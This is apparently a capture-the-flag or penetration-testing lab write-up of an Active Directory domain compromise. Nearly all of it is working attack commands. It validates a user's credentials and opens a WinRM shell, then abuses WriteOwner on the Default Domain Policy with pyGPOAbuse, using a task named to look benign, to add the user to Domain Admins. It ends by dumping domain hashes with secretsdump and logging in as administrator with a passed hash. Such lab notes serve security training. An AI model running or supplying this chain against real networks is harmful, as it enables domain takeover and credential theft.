##Initial_Access 

nxc ldap 192.168.x.97 -u charlotte -p 'Game20n4.!'
	==> Validated Charlotte's creds against DC's directory service

nxc winrm 192.168.x.97 -u charlotte -p 'Game20n4.!'
	==> ensure winrm accepts charlotte's creds

evil-winrm -i 192.168.x.97 -u charlotte -p 'Game20n4.!'
	whoami; hostname; type local.txt

 - BloodHound analysis showed that charlotte is WriteOwner on the Default Domain Policy (DDP) GPO. 

	==> WriteOwner means the principal can change the GPO's discretionary ACL and, more importantly for our purposes, modify GPO contents (logon scripts, scheduled tasks, immediate scheduled tasks) that will execute on domain-joined machines that received the policy. This makes the DDP a powerful code-distribution primitive for domain escalation when held by a non-privileged user.

- Use pyGPOAbuse (https://github.com/Hackndo/pyGPOAbuse) to inject a powershell command into the DDP. The task is named "Webdev disable" for benign appearance and executes a single command that adds charlotte to the Domain Admins group. 
	- The command below authenticates as charlotte, targets the DDP GPO ID (31B3F23-016D-11D2-945F-00C04FB984F9) and pushes the powershell action via the domain controller 192.168.x.97. After Group Policy replication and application, the membership update takes effect.
			==> GPO ID revealed from GPOPath in BloodHound [DEFAULT DOMAIN POLICY@SECURA.YZX]

python3 pygpoabuse.py 'secura.yzx/charlotte:Game20n4.!' -gpo-id "31B3F23-016D-11D2-945F-00C04FB984F9" -taskname "Webdev disable" -dc-ip 192.168.x.97 -powershell -command "net group 'Domain Admins' charlotte /add"

net user charlotte /domain
	==> Verify charlotte belongs to Domain Admins

python3 impacket-secretsdump "secura.yzx/charlotte":'Game20n4.!'@"dc01.secura.yzx"

evil-winrm -i dc01 -u administrator -H 'd38e7c660.....ca76b1'
	whoami; id; hostname; ipconfig; type proof.txt





